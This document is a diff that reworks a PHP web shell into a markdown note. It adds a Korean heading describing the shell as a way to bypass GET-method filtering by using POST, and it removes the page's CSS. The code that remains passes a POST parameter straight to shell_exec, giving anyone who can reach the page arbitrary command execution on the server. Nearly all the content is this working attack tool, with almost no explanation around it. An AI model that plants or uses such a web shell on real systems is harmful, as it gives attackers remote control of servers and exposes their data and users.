@@ -1,3 +1,7 @@
+
+# POST 방식으로 GET 방식 필터링 우회용
+
+```php
 <?php
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
@@ -10,64 +14,6 @@ if (!empty($_POST['cmd'])) {
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Web Shell</title>
-    <style>
-        * {
-            -webkit-box-sizing: border-box;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: sans-serif;
-            color: rgba(0, 0, 0, .75);
-        }
-
-        main {
-            margin: auto;
-            max-width: 850px;
-        }
-
-        pre,
-        input,
-        button {
-            padding: 10px;
-            border-radius: 5px;
-            background-color: #efefef;
-        }
-
-        label {
-            display: block;
-        }
-
-        input {
-            width: 100%;
-            background-color: #efefef;
-            border: 2px solid transparent;
-        }
-
-        input:focus {
-            outline: none;
-            background: transparent;
-            border: 2px solid #e6e6e6;
-        }
-
-        button {
-            border: none;
-            cursor: pointer;
-            margin-left: 5px;
-        }
-
-        button:hover {
-            background-color: #e6e6e6;
-        }
-
-        .form-group {
-            display: -webkit-box;
-            display: -ms-flexbox;
-            display: flex;
-            padding: 15px 0;
-        }
-    </style>
-
 </head>
 
 <body>
@@ -95,3 +41,4 @@ if (!empty($_POST['cmd'])) {
     </main>
 </body>
 </html>
+```
